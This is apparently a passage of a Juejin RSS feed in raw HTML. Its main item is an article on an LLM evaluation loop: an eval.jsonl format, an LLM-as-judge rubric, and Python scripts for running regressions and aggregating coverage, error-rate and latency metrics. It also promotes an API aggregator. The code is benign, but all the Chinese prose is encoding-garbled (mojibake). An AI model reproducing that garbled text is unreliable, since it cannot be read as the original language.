<li>éƒ¨åˆ†ç»Ÿè®¡ä¿¡æ¯æ˜¯ä¼°ç®—çš„ï¼Œå¹¶éç²¾ç¡®å€¼</li>
<li>EXPALINåªèƒ½è§£é‡ŠSELECTæ“ä½œï¼Œå…¶ä»–æ“ä½œè¦é‡å†™ä¸ºSELECTåæŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LLM åº”ç”¨è¯„æµ‹é—­ç¯ï¼ševal.jsonl + LLM-as-judge + çº¿ä¸ŠæŒ‡æ ‡ï¼ˆå« Python æœ€å°å®ç°ï¼‰]]></title>    <link>https://juejin.cn/post/7592637149696639011</link>    <guid>https://juejin.cn/post/7592637149696639011</guid>    <pubDate>2026-01-08T08:07:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592637149696639011" data-draft-id="7592622563546071075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LLM åº”ç”¨è¯„æµ‹é—­ç¯ï¼ševal.jsonl + LLM-as-judge + çº¿ä¸ŠæŒ‡æ ‡ï¼ˆå« Python æœ€å°å®ç°ï¼‰"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,AIGC"/> <meta itemprop="datePublished" content="2026-01-08T08:07:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="147API"/> <meta itemprop="url" content="https://juejin.cn/user/872345976974154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LLM åº”ç”¨è¯„æµ‹é—­ç¯ï¼ševal.jsonl + LLM-as-judge + çº¿ä¸ŠæŒ‡æ ‡ï¼ˆå« Python æœ€å°å®ç°ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/872345976974154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    147API
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:07:18.000Z" title="Thu Jan 08 2026 08:07:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ”¹ promptã€æ¢æ¨¡å‹ã€åŠ  RAGã€åŠ å·¥å…·è°ƒç”¨ä¹‹åï¼Œæœ€éš¾çš„é—®é¢˜å¾€å¾€ä¸æ˜¯â€œæ€ä¹ˆæ”¹â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>æ€ä¹ˆè¯æ˜æ”¹åŠ¨çœŸçš„å˜å¥½äº†ï¼Ÿ</strong></p>
</blockquote>
<p>è¿™ç¯‡ç›´æ¥ç»™ä½ ä¸€ä¸ªæœ€å°å¯è½åœ°çš„è¯„æµ‹é—­ç¯ï¼š</p>
<ul>
<li>ç¦»çº¿ï¼š<code>eval.jsonl</code> å›å½’é›†ï¼ˆ50 æ¡å…ˆè·‘èµ·æ¥ï¼‰</li>
<li>è‡ªåŠ¨è¯„æµ‹ï¼šLLM-as-judgeï¼ˆrubric + JSON æ ¡éªŒï¼‰</li>
<li>çº¿ä¸Šï¼šå…³é”®å­—æ®µæ‰“ç‚¹ï¼ˆèƒ½å›ç­”â€œå“ªé‡Œæ…¢/å“ªé‡Œè´µ/å“ªé‡Œé”™â€ï¼‰</li>
<li>å‘å¸ƒï¼šé—¨ç¦ + ç°åº¦ + å›æ»š</li>
</ul>
<hr/>
<h2 data-id="heading-0">0ï¼‰ç›®å½•ç»“æ„ï¼ˆå»ºè®®ç…§æŠ„ï¼‰</h2>
<pre><code class="hljs language-text" lang="text">eval/
  eval.jsonl
  run_eval.py
  judge.py
  aggregate.py
</code></pre>
<hr/>
<h2 data-id="heading-1">1ï¼‰è¯„æµ‹é›†æ ¼å¼ï¼ˆeval.jsonlï¼‰</h2>
<p>åˆ«å†™â€œæ ‡å‡†ç­”æ¡ˆå…¨æ–‡â€ï¼Œå†™å…³é”®ç‚¹ï¼ˆæ›´ç¨³å®šã€æ›´å¥½åˆ¤åˆ†ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"q001"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"chat"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"question"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"gold_keypoints"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">,</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"notes"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"åˆ¤åˆ†å£å¾„"</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"q101"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"rag"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"question"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"gold_keypoints"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"gold_evidence_ids"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">"docA#p3"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"q201"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"tool"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"question"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"gold_keypoints"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">"..."</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"expected_tool_calls"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">"get_order_status"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-2">2ï¼‰ç»Ÿä¸€ LLM è°ƒç”¨ï¼ˆOpenAI å…¼å®¹ï¼‰</h2>
<pre><code class="hljs language-bash" lang="bash">pip install -U openai
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># run_eval.py</span>
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">call_llm</span>(<span class="hljs-params">base_url: <span class="hljs-built_in">str</span>, api_key: <span class="hljs-built_in">str</span>, model: <span class="hljs-built_in">str</span>, messages: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>]</span>) -&gt; <span class="hljs-built_in">dict</span>:
    client = OpenAI(api_key=api_key, base_url=base_url)
    t0 = time.time()
    resp = client.chat.completions.create(model=model, messages=messages)
    latency_ms = <span class="hljs-built_in">int</span>((time.time() - t0) * <span class="hljs-number">1000</span>)
    usage = <span class="hljs-built_in">getattr</span>(resp, <span class="hljs-string">"usage"</span>, <span class="hljs-literal">None</span>)
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"text"</span>: resp.choices[<span class="hljs-number">0</span>].message.content,
        <span class="hljs-string">"latency_ms"</span>: latency_ms,
        <span class="hljs-string">"usage"</span>: usage.model_dump() <span class="hljs-keyword">if</span> usage <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,
    }
</code></pre>
<blockquote>
<p>è¯´æ˜ï¼šå¦‚æœä½ ç”¨çš„æ˜¯æŸ OpenAI å…¼å®¹å…¥å£ï¼ˆä¾‹å¦‚å¤§æ¨¡å‹èšåˆå¹³å°<a href="https://link.juejin.cn?target=https%3A%2F%2F147ai.com%2F%3Futm_source%3Djuejin%26utm_medium%3Dcontent%26utm_campaign%3Dllm_daily%26utm_content%3Dday00_getting-started" target="_blank" title="https://147ai.com/?utm_source=juejin&amp;utm_medium=content&amp;utm_campaign=llm_daily&amp;utm_content=day00_getting-started" ref="nofollow noopener noreferrer"> 147ai</a>ï¼‰ï¼Œå¤šæ•°æ—¶å€™åªæ”¹ï¼š<br/>
<code>base_url=https://147ai.com/v1</code>ï¼Œç«¯ç‚¹ <code>POST /v1/chat/completions</code>ï¼Œé‰´æƒ <code>Authorization: Bearer &lt;KEY&gt;</code>ï¼ˆä»¥æ§åˆ¶å°/æ–‡æ¡£ä¸ºå‡†ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">3ï¼‰LLM-as-judgeï¼ˆrubric + JSON æ ¡éªŒï¼‰</h2>
<p>è¯„æµ‹å‘˜å¿…é¡»è¢«â€œå¡æ­»è¾“å‡ºæ ¼å¼â€ï¼Œå¦åˆ™æ— æ³•è‡ªåŠ¨åŒ–ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># judge.py</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> run_eval <span class="hljs-keyword">import</span> call_llm

RUBRIC = <span class="hljs-string">"""ä½ æ˜¯è¯„æµ‹å‘˜ã€‚å¯¹ç­”æ¡ˆæŒ‰è§„åˆ™è¾“å‡º JSONï¼ˆä¸è¦è¾“å‡ºå¤šä½™æ–‡æœ¬ï¼‰ï¼š
{
  "keypoint_covered": 0,
  "keypoint_total": 0,
  "critical_error": false,
  "rationale": "ä¸€å¥è¯è§£é‡Š"
}
åˆ¤å®šè¯´æ˜ï¼š
1) keypoint_coveredï¼šç­”æ¡ˆè¦†ç›–äº†å¤šå°‘ gold_keypointsï¼ˆåªè¦è¡¨è¾¾åŒä¹‰å³å¯ç®—è¦†ç›–ï¼‰
2) critical_errorï¼šå‡ºç°ä¸¥é‡äº‹å®é”™è¯¯/è¯¯å¯¼å†³ç­–åˆ™ä¸º true
åªå…è®¸è¾“å‡º JSONã€‚"""</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">robust_json_parse</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-comment"># æœ€å°å®ç°ï¼šæŠ“ç¬¬ä¸€ä¸ª {...}ï¼›ç”Ÿäº§å»ºè®®åšæ›´ä¸¥æ ¼çš„ JSON schema æ ¡éªŒ</span>
    l = s.find(<span class="hljs-string">"{"</span>)
    r = s.rfind(<span class="hljs-string">"}"</span>)
    <span class="hljs-keyword">if</span> l == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> r == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> r &lt;= l:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"no json object"</span>)
    <span class="hljs-keyword">return</span> json.loads(s[l:r+<span class="hljs-number">1</span>])

<span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">base_url: <span class="hljs-built_in">str</span>, api_key: <span class="hljs-built_in">str</span>, judge_model: <span class="hljs-built_in">str</span>, question: <span class="hljs-built_in">str</span>, answer: <span class="hljs-built_in">str</span>, gold_keypoints: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">dict</span>:
    messages = [
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: RUBRIC},
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: json.dumps({
            <span class="hljs-string">"question"</span>: question,
            <span class="hljs-string">"answer"</span>: answer,
            <span class="hljs-string">"gold_keypoints"</span>: gold_keypoints
        }, ensure_ascii=<span class="hljs-literal">False</span>)}
    ]
    out = call_llm(base_url, api_key, judge_model, messages)
    parsed = robust_json_parse(out[<span class="hljs-string">"text"</span>])
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"parsed"</span>: parsed,
        <span class="hljs-string">"raw"</span>: out[<span class="hljs-string">"text"</span>],
        <span class="hljs-string">"latency_ms"</span>: out[<span class="hljs-string">"latency_ms"</span>],
        <span class="hljs-string">"usage"</span>: out[<span class="hljs-string">"usage"</span>],
    }
</code></pre>
<hr/>
<h2 data-id="heading-4">4ï¼‰è·‘å›å½’ï¼ševal.jsonl â†’ results.jsonl</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># run_eval.py (continued)</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> judge <span class="hljs-keyword">import</span> judge

<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_eval</span>(<span class="hljs-params">eval_path: <span class="hljs-built_in">str</span>, out_path: <span class="hljs-built_in">str</span>, base_url: <span class="hljs-built_in">str</span>, api_key: <span class="hljs-built_in">str</span>, model_under_test: <span class="hljs-built_in">str</span>, judge_model: <span class="hljs-built_in">str</span></span>):
    rows = [json.loads(l) <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(eval_path, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>)]
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(out_path, <span class="hljs-string">"w"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rows:
            q = r[<span class="hljs-string">"question"</span>]
            msgs = [
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸¥è°¨çš„æŠ€æœ¯åŠ©æ‰‹ã€‚è¯·æŒ‰è¦ç‚¹å›ç­”ã€‚"</span>},
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: q},
            ]
            ans = call_llm(base_url, api_key, model_under_test, msgs)
            j = judge(base_url, api_key, judge_model, q, ans[<span class="hljs-string">"text"</span>], r.get(<span class="hljs-string">"gold_keypoints"</span>, []))
            f.write(json.dumps({
                <span class="hljs-string">"id"</span>: r.get(<span class="hljs-string">"id"</span>),
                <span class="hljs-string">"type"</span>: r.get(<span class="hljs-string">"type"</span>),
                <span class="hljs-string">"answer"</span>: ans,
                <span class="hljs-string">"judge"</span>: j,
            }, ensure_ascii=<span class="hljs-literal">False</span>) + <span class="hljs-string">"\n"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-5">5ï¼‰èšåˆæŒ‡æ ‡ï¼šæŠŠç»“æœå˜æˆâ€œèƒ½é—¨ç¦çš„æ•°å­—â€</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># aggregate.py</span>
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">def</span> <span class="hljs-title function_">agg</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>):
    rows = [json.loads(l) <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>)]
    n = <span class="hljs-built_in">len</span>(rows)
    covered = <span class="hljs-number">0</span>
    total = <span class="hljs-number">0</span>
    critical_err = <span class="hljs-number">0</span>
    p95 = <span class="hljs-number">0</span>
    latencies = []
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rows:
        j = r[<span class="hljs-string">"judge"</span>][<span class="hljs-string">"parsed"</span>]
        covered += <span class="hljs-built_in">int</span>(j.get(<span class="hljs-string">"keypoint_covered"</span>, <span class="hljs-number">0</span>))
        total += <span class="hljs-built_in">int</span>(j.get(<span class="hljs-string">"keypoint_total"</span>, <span class="hljs-number">0</span>))
        critical_err += <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> j.get(<span class="hljs-string">"critical_error"</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        latencies.append(<span class="hljs-built_in">int</span>(r[<span class="hljs-string">"answer"</span>].get(<span class="hljs-string">"latency_ms"</span>, <span class="hljs-number">0</span>)))
    latencies.sort()
    <span class="hljs-keyword">if</span> latencies:
        p95 = latencies[<span class="hljs-built_in">int</span>(<span class="hljs-number">0.95</span> * (<span class="hljs-built_in">len</span>(latencies) - <span class="hljs-number">1</span>))]
    <span class="hljs-built_in">print</span>({
        <span class="hljs-string">"n"</span>: n,
        <span class="hljs-string">"keypoint_coverage"</span>: (covered / total) <span class="hljs-keyword">if</span> total <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,
        <span class="hljs-string">"critical_error_rate"</span>: (critical_err / n) <span class="hljs-keyword">if</span> n <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,
        <span class="hljs-string">"latency_p95_ms"</span>: p95,
    })

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    agg(<span class="hljs-string">"results.jsonl"</span>)
</code></pre>
<blockquote>
<p>é—¨ç¦å»ºè®®ï¼šä¼˜å…ˆç”¨ <code>critical_error_rate</code> ä½œä¸ºç¡¬é—¨ç¦ï¼Œå…¶æ¬¡çœ‹è¦†ç›–ç‡ä¸ P95 å»¶è¿Ÿ/æˆæœ¬ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">6ï¼‰çº¿ä¸ŠæŒ‡æ ‡ï¼ˆæœ€å°å­—æ®µé›†ï¼‰</h2>
<p>ç¦»çº¿èƒ½å‘Šè¯‰ä½ â€œè´¨é‡æœ‰æ²¡æœ‰é€€åŒ–â€ï¼Œçº¿ä¸Šè¦å‘Šè¯‰ä½ â€œä¸ºä»€ä¹ˆé€€åŒ–â€ï¼š</p>
<ul>
<li><strong>ç‰ˆæœ¬å­—æ®µ</strong>ï¼š<code>model</code>ã€<code>model_version</code>ã€<code>prompt_version</code>ã€<code>retrieval_onoff</code></li>
<li><strong>ä½“éªŒ/æˆæœ¬</strong>ï¼š<code>latency_ms(P50/P95)</code>ã€<code>input_tokens/output_tokens/total_tokens</code></li>
<li><strong>ç¨³å®šæ€§</strong>ï¼š<code>error_code</code>ã€<code>retry_count</code>ã€<code>fallback</code></li>
<li><strong>RAG/å·¥å…·</strong>ï¼š<code>retrieval_k</code>ã€ï¼ˆå¦‚æœ‰ï¼‰<code>hit@k</code>ã€<code>tool_calls</code>ã€<code>tool_success</code></li>
</ul>
<hr/>
<h2 data-id="heading-7">7ï¼‰å‘å¸ƒé—¨ç¦ï¼ˆç¦»çº¿ + ç°åº¦ + å›æ»šï¼‰</h2>
<p>å¯æ‰§è¡Œæ¨¡æ¿ï¼š</p>
<ol>
<li>ç¦»çº¿å›å½’ï¼šä¸¥é‡é”™è¯¯ç‡ä¸å‡é«˜ã€è¦†ç›–ç‡ä¸ä¸‹é™ã€token/P95 ä¸è¶…é¢„ç®—</li>
<li>ç°åº¦ï¼š1%â†’5%â†’20%ï¼Œç›‘æ§å¼‚å¸¸å‘Šè­¦</li>
<li>å›æ»šï¼šèƒ½ä¸€é”®å›æ»š <code>model / prompt_version / retrieval_onoff</code></li>
</ol>
<hr/>
<p>å¦‚æœä½ è¦æŠŠè¿™ä¸€å¥—è¿›ä¸€æ­¥å·¥ç¨‹åŒ–ï¼Œæˆ‘å»ºè®®ä¸‹ä¸€æ­¥åšï¼š</p>
<ul>
<li>æŠŠç»“æœè½åˆ°æ•°æ®åº“ï¼ˆæ”¯æŒæŒ‰ç‰ˆæœ¬å¯¹æ¯”ï¼‰</li>
<li>å¯¹ judge è¾“å‡ºåš schema æ ¡éªŒ + é‡è¯• + æŠ½æ£€</li>
<li>å¼•å…¥ RAG ä¸“å±æŒ‡æ ‡ï¼šhit@k / cite_accï¼ˆå…ˆè¯„æ£€ç´¢å†è¯„ç”Ÿæˆï¼‰</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†³æˆ˜ç´«ç¦ä¹‹å·…ï¼šOpencode vs Claude Codeï¼Œè°æ‰æ˜¯ä½ çš„çœŸÂ·èµ›åšä¹‰çˆ¶ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592683699772194826</link>    <guid>https://juejin.cn/post/7592683699772194826</guid>    <pubDate>2026-01-08T07:35:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699772194826" data-draft-id="7592816646869270537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†³æˆ˜ç´«ç¦ä¹‹å·…ï¼šOpencode vs Claude Codeï¼Œè°æ‰æ˜¯ä½ çš„çœŸÂ·èµ›åšä¹‰çˆ¶ï¼Ÿ"/> <meta itemprop="keywords" content="Claude,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T07:35:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°ç™½ç‚¹point"/> <meta itemprop="url" content="https://juejin.cn/user/4353721774639118"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†³æˆ˜ç´«ç¦ä¹‹å·…ï¼šOpencode vs Claude Codeï¼Œè°æ‰æ˜¯ä½ çš„çœŸÂ·èµ›åšä¹‰çˆ¶ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721774639118/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°ç™½ç‚¹point
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:35:11.000Z" title="Thu Jan 08 2026 07:35:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
